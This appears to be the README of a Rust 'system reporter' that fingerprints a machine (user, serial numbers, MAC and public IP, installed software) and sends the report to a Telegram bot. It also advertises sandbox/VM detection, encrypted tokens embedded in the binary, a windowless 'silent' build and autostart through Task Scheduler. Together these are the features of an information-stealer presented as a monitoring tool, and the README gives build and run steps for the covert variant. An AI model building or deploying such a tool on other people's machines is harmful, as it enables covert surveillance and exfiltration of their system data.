# System Reporter 🦀

**Профессиональный сборщик системной информации на Rust**

Мощное кроссплатформенное приложение для полного сбора информации о системе с расширенными возможностями для Windows через WMI и опциональной отправкой отчетов в Telegram.

## ✨ Ключевые возможности

- 🖥️ **Полный сбор системной информации** - CPU, RAM, диски, сеть, процессы
- 🪟 **Глубокая интеграция Windows** - WMI для сбора информации о GPU, BIOS, материнской плате
- 🤖 **Telegram интеграция** - автоматическая отправка отчетов в Telegram
- 🔐 **Шифрование токенов** - AES-256-GCM для защиты учетных данных (v0.4.0)
- 🖥️ **Информация о дисплеях** - разрешение, частота обновления, ориентация (v0.4.0)
- 📦 **Встроенные токены** - токены компилируются внутрь exe через .env файл (NEW в v0.4.1)
- 🔇 **Скрытый режим** - запуск без консольного окна на Windows (NEW в v0.4.1)
- 🌐 **Внешний IP** - определение публичного IP-адреса (v0.3.0)
- 📦 **Установленное ПО** - полный список программ на системе (v0.3.0)
- 🔍 **VM/Sandbox детектор** - обнаружение подозрительных процессов и драйверов
- 📊 **TOP процессы** - анализ процессов по использованию CPU и памяти
- 🎯 **Простота использования** - один бинарник, никаких внешних зависимостей
- 🌍 **Кроссплатформенность** - Windows, Linux, macOS

## 📋 Собираемая информация

### 🔧 Модуль 1: Базовая информация системы
- Имя пользователя и хоста
- Операционная система, версия и архитектура
- Время работы системы (uptime) в секундах и читаемом формате

### 💻 Модуль 2: Оборудование
- **Процессор:**
  - Модель и бренд
  - Количество физических и логических ядер
  - Частота работы (MHz)
- **Память (RAM):**
  - Общий объем
  - Используемая память
  - Доступная память
  - Процент использования

### 💾 Модуль 3: Диски
- Список всех дисков с:
  - Именем/буквой
  - Размером
  - Типом (HDD/SSD)
  - Интерфейсом (для Windows)
- Общее и использованное дисковое пространство

### 🌐 Модуль 4: Сетевая информация
- Локальный IP-адрес
- MAC-адреса всех сетевых адаптеров
- Список всех сетевых интерфейсов

### 🪟 Модуль 5: Глубокая информация (Windows + WMI)
- **GPU (Видеокарты):**
  - Название
  - Объем видеопамяти (VRAM)
- **Системная плата:**
  - Производитель компьютера
  - Модель компьютера
- **BIOS:**
  - Производитель
  - Версия
  - Серийный номер
- **Материнская плата:**
  - Производитель
  - Модель
  - Серийный номер

### 📊 Модуль 6: Программное обеспечение
- Общее количество запущенных процессов
- TOP-10 процессов по использованию памяти
- TOP-10 процессов по использованию CPU
- **VM/Sandbox детектор:**
  - Подозрительные процессы (VMware, VirtualBox, QEMU, Xen, Parallels)
  - Подозрительные драйверы (только Windows)

### 🖥️ Модуль 7: Дисплеи (NEW в v0.4.0)
- Количество подключенных дисплеев
- Для каждого дисплея:
  - ID и имя
  - Разрешение (ширина x высота)
  - Частота обновления (Hz)
  - Основной дисплей или нет
  - Угол поворота (rotation)

### 📝 Метаинформация
- Дата и время генерации отчета (RFC3339)
- Версия программы

```bash
# 1. Клонирование репозитория

# 2. Сборка release версии
cargo build --release
```

### Режим с Telegram

#### 🆕 Вариант 1: Встроенные токены через .env (🔥 Лучший способ, NEW в v0.4.1)

Токены компилируются ВНУТРЬ exe-файла! Не нужно передавать переменные окружения при каждом запуске:

```bash
# 1. Создайте .env файл из примера
cp .env.example .env

# 2. Отредактируйте .env и добавьте свои токены
# Используйте либо зашифрованные (рекомендуется):
ENCRYPTED_BOT_TOKEN=...
ENCRYPTED_CHAT_ID=...
ENCRYPTION_PASSWORD=...

# Либо незашифрованные (если не требуется безопасность):
# TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
# TELEGRAM_CHAT_ID=987654321

# 3. Соберите проект - токены автоматически встроятся!
cargo build --release

# 4. Теперь exe можно запускать БЕЗ переменных окружения!
./target/release/system_reporter
```

⭐ **Преимущества:**
- Токены встроены в exe - не нужны переменные окружения
- Можно создать standalone exe и распространить
- При сборке build.rs автоматически встраивает .env
- Приоритет: системные env → встроенные env

⚠️ **Важно:** Не распространяйте этот exe публично, он содержит ваши токены!

#### Вариант 2: Зашифрованные токены через env (🔐 Рекомендуется)

Для максимальной безопасности используйте зашифрованные токены:

```bash
# 1. Сгенерируйте зашифрованные токены
cargo run --release --bin encrypt_tokens

# 2. Программа выведет команды для установки переменных окружения
# 3. Скопируйте и выполните эти команды
```

**Windows (PowerShell):**
```powershell
$env:ENCRYPTED_BOT_TOKEN="сгенерированный_токен..."
$env:ENCRYPTED_CHAT_ID="сгенерированный_chat_id..."
$env:ENCRYPTION_PASSWORD="ваш_пароль"
cargo run --release
```

**Linux/macOS:**
```bash
export ENCRYPTED_BOT_TOKEN="сгенерированный_токен..."
export ENCRYPTED_CHAT_ID="сгенерированный_chat_id..."
export ENCRYPTION_PASSWORD="ваш_пароль"
cargo run --release
```

#### Вариант 3: Незашифрованные токены (⚠️ Менее безопасно)

**Windows (PowerShell):**
```powershell
$env:TELEGRAM_BOT_TOKEN="123456:ABC-DEF..."
$env:TELEGRAM_CHAT_ID="987654321"
cargo run --release
```

**Windows (CMD):**
```cmd
set TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
set TELEGRAM_CHAT_ID=987654321
cargo run --release
```

**Linux/macOS:**
```bash
export TELEGRAM_BOT_TOKEN="123456:ABC-DEF..."
export TELEGRAM_CHAT_ID="987654321"
cargo run --release
```

⚠️ **Примечание:** При использовании незашифрованных токенов программа выведет предупреждение.

### Сборка для Windows

Для удобства созданы готовые скрипты сборки:

#### Обычная сборка (с консольным окном)

**Вариант 1: CMD (build_windows.bat)**
```cmd
build_windows.bat
```

**Вариант 2: PowerShell (build_windows.ps1)**
```powershell
.\build_windows.ps1
```

Скрипты автоматически:
- Проверяют установку Rust и .env файл
- Очищают предыдущие сборки
- Встраивают токены из .env (если есть)
- Собирают release версию
- Показывают размер и путь к исполняемому файлу
- (PowerShell) Предлагают создать standalone версию

#### 🆕 Скрытая сборка (БЕЗ консольного окна, NEW в v0.4.1)

Для создания полностью скрытой версии (запускается в фоне без окон):

```powershell
.\build_windows_silent.ps1
```

**Особенности скрытой сборки:**
- 🔇 **Без консольного окна** - exe запускается полностью скрытно
- 📝 **Логирование в файл** - все выводы пишутся в `system_reporter.log`
- 📦 **Встроенные токены** - автоматически из .env
- 🚀 **Автотестирование** - опция тестового запуска после сборки
- 💼 **Standalone exe** - создает готовый `system_reporter_silent.exe`

**Использование:**
```powershell
# 1. Создайте .env с токенами
cp .env.example .env
# Отредактируйте .env

# 2. Соберите скрытую версию
.\build_windows_silent.ps1

# 3. Запустите - окно не появится!
.\system_reporter_silent.exe

# 4. Проверьте логи
Get-Content system_reporter.log -Tail 20
```

**Режимы работы:**
- 🐛 **Debug режим**: Показывает консоль (для отладки)
- 🚀 **Release режим**: Полностью скрыт (production)

**Применение:**
- Автозапуск при старте Windows (Task Scheduler)
- Фоновый мониторинг системы
- Периодическая отправка отчетов
- Корпоративное развертывание

## 🔧 Расширение функциона ла

### Добавление новых WMI-запросов (Windows)

```rust
#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_YourClass")]
#[serde(rename_all = "PascalCase")]
struct YourClass {
    property_name: String,
}

#[cfg(target_os = "windows")]
fn get_your_data(wmi_con: &Option<WMIConnection>) -> Vec<String> {
    let data: Vec<YourClass> = get_wmi_data(wmi_con,
        "SELECT PropertyName FROM Win32_YourClass");

    data.iter().map(|d| d.property_name.clone()).collect()
}
```

### Добавление новых модулей сбора

Просто добавьте новую функцию и вызовите её в `collect_system_info()`:

```rust
fn collect_custom_info() -> Vec<String> {
    // Ваша логика
    vec!["data1".to_string(), "data2".to_string()]
}
```

## 🐛 Устранение неполадок

### Ошибки компиляции

```bash
# Обновите Rust
rustup update

# Очистите кэш
cargo clean

# Пересоберите
cargo build --release
```

### WMI не работает (Windows)

1. Проверьте, что служба WMI запущена:
   ```powershell
   Get-Service Winmgmt
   ```

2. Запустите от имени администратора для полного доступа к WMI

3. Если WMI не инициализируется, программа продолжит работу без WMI-данных

### Telegram не отправляет

1. Проверьте токен и Chat ID:
   ```bash
   echo $TELEGRAM_BOT_TOKEN
   echo $TELEGRAM_CHAT_ID
   ```

2. Проверьте интернет-соединение

3. Убедитесь, что бот не заблокирован и вы написали ему `/start`

### Проблемы с правами доступа (Linux/macOS)

Некоторые системные данные требуют sudo:

```bash
sudo ./target/release/system_reporter
```

## 🔐 Безопасность

### 🆕 Шифрование токенов (v0.4.0)

System Reporter теперь поддерживает **военного уровня шифрование** для защиты Telegram учетных данных:

- **Алгоритм:** AES-256-GCM (Authenticated Encryption)
- **Ключ деривация:** Argon2 (устойчив к GPU/ASIC атакам)
- **Формат:** Base64(Nonce + Salt + Ciphertext)

Используйте утилиту шифрования:
```bash
cargo run --release --bin encrypt_tokens
```

Подробная инструкция в [tools/README.md](tools/README.md)
